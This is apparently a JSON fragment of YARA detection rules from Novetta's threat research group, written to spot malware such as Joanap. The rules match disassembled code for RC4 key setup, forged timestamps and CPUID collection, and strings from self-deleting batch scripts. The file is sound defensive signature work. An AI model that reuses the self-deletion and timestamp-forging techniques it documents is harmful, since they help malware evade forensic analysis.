  "GenerateTLSClientHelloPacket_Test": "rule GenerateTLSClientHelloPacket_Test: sharedcode\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"eff542ac8e37db48821cb4e5a7d95c044fff27557763de3a891b40ebeb52cc55.ex_\"\n\n\tstrings:\n\t/*\n\t\t25 07 00 00 80  and     eax, 80000007h\n\t\t79 05           jns     short loc_405EC8; um, nope.. this will always happen\n\t\t48              dec     eax\n\t\t83 C8 F8        or      eax, 0FFFFFFF8h\n\t\t40              inc     eax\n\t*/\n\n\t$a = {25 07 00 00 80 79 ?? 4? \t83 ?? F8 4? }\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "RC4SboxKeyGen": "rule RC4SboxKeyGen: sharedcode\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"RT_RCDATA_101.bin.bin\"\n\n\tstrings:\n\t/*\n\t\t8A 4C 04 08        mov     cl, [esp+eax+108h+sbox]; cl = sbox[i]\n\t\t8B D0              mov     edx, eax\n\t\t81 E2 0F 00 00 80  and     edx, 8000000Fh  ; i % 16\n\t\t79 05              jns     short loc_10003AC8; dl = key[i & 16]\n\t\t4A                 dec     edx\n\t\t83 CA F0           or      edx, 0FFFFFFF0h\n\t\t42                 inc     edx\n\t*/\n\n\t$a = {\t8A [3] \t8B ?? \t81 ?? 0F 00 00 80 79 ?? 4? 83 ?? F0 4? \t}\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "RandomTimestampGenerator": "rule RandomTimestampGenerator: sharedcode\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"RT_RCDATA_101.bin.bin joanap baseline sample\"\n\n\tstrings:\n\t/*\n\t\t66 81 44 24 0C FE FF  add     [esp+1Ch+SystemTime.wYear], 0FFFEh\n\t\tFF D6                 call    esi ; rand\n\t\t99                    cdq\n\t\tB9 0C 00 00 00        mov     ecx, 0Ch\n\t\tF7 F9                 idiv    ecx\n\t\t42                    inc     edx\n\t\t66 89 54 24 0E        mov     [esp+1Ch+SystemTime.wMonth], dx\n\t\tFF D6                 call    esi ; rand\n\t\t99                    cdq\n\t\tB9 1C 00 00 00        mov     ecx, 1Ch\n\t\tF7 F9                 idiv    ecx\n\t\t42                    inc     edx\n\t\t66 89 54 24 12        mov     [esp+1Ch+SystemTime.wDay], dx\n\t\tFF D6                 call    esi ; rand\n\t\t99                    cdq\n\t\tB9 17 00 00 00        mov     ecx, 17h\n\t\tF7 F9                 idiv    ecx\n\t\t42                    inc     edx\n\t\t66 89 54 24 14        mov     [esp+1Ch+SystemTime.wHour], dx\n\t\tFF D6                 call    esi ; rand\n\t\t99                    cdq\n\t\tB9 3B 00 00 00        mov     ecx, 3Bh\n\t\tF7 F9                 idiv    ecx\n\t\t42                    inc     edx\n\t\t66 89 54 24 16        mov     [esp+1Ch+SystemTime.wMinute], dx\n\t\tFF D6                 call    esi ; rand\n\t\t99                    cdq\n\t\tB9 3B 00 00 00        mov     ecx, 3Bh\n\t\tF7 F9                 idiv    ecx\n\t*/\n\n\t$a = {\t66 81 [3] FE FF FF [1-4] 99 B9 0C 00 00 00 F7 [1-4] 42 \t66 89 [3]  FF D6 99 B9 1C 00 00 00 F7 [1-4] 42 \t66 89 [3] FF D6 99 B9 17 00 00 00 F7 [1-4] 42 66 89 [3] FF D6 99 B9 3B 00 00 00 F7 [1-4] 42 66 89 [3] FF D6 99 \tB9 3B 00 00 00 \tF7 }\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "CPUInfoExtraction": "rule CPUInfoExtraction\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"Cmd10010_296fcc9d611ca1b8f8288192d6d854cf4072853010cc65cb0c7f958626999fbd.bin\"\n\n\tstrings:\n\t/*\n\t\t68 00 00 00 80     push    80000000h       ; a2\n\t\t8B 02              mov     eax, [edx]\n\t\t8B 4A 04           mov     ecx, [edx+4]\n\t\t89 4C 24 10        mov     [esp+2Ch+var_1C], ecx\n\t\t8B 4A 08           mov     ecx, [edx+8]\n\t\t89 4C 24 14        mov     [esp+2Ch+var_18], ecx\n\t\t8B 4A 0C           mov     ecx, [edx+0Ch]\n\t\t8D 54 24 1C        lea     edx, [esp+2Ch+var_10]\n\t\t89 8E 70 03 00 00  mov     [esi+370h], ecx\n\t\t52                 push    edx             ; a1\n\t\t8B CE              mov     ecx, esi\n\t\t89 86 6C 03 00 00  mov     [esi+36Ch], eax\n\t\tE8 29 FF FF FF     call    GetCPUIDValues\n\t\t8B C8              mov     ecx, eax\n\t\t8B 01              mov     eax, [ecx]\n\t\t3D 00 00 00 80     cmp     eax, 80000000h\n\t\t8B 51 04           mov     edx, [ecx+4]\n\t*/\n\n\t$a = {68 00 00 00 80 8B ?? 8B ?? 04 89 [3] 8B ?? 08 89 [3] 8B ?? 0C 8D [3] 89 [5] 5? 8B ?? 89 [5] E8 [4] 8B ?? 8B ?? \t3D 00 00 00 80 8B ?? 04 }\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "SuicideScriptL1": "rule SuicideScriptL1\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \":L1\\ndel \\\"%s\\\"\\nif exist \\\"%s\\\" goto L1\\ndel \\\"%s\\\"\\n\"\n\tcondition:\n\t\tany of them\n}",
  "SuicideScriptR1_Multi": "rule SuicideScriptR1_Multi\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\n\tstrings:\n\t\t$ = \"\\\" goto R1\\ndel /a \\\"\"\n\t\t$ = \"\\\"\\nif exist \\\"\"\n\t\t$ = \"@echo off\\n:R1\\ndel /a \\\"\"\n\tcondition:\n\t\tall of them\n}",
  "SuicideScriptR": "rule SuicideScriptR\n{\n\t// joanap, joanapCleaner\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \":R\\nIF NOT EXIST %s GOTO E\\ndel /a %s\\nGOTO R\\n:E\\ndel /a d.bat\"\n\t\t\n\tcondition:\n\t\tall of them\n\n}"
}
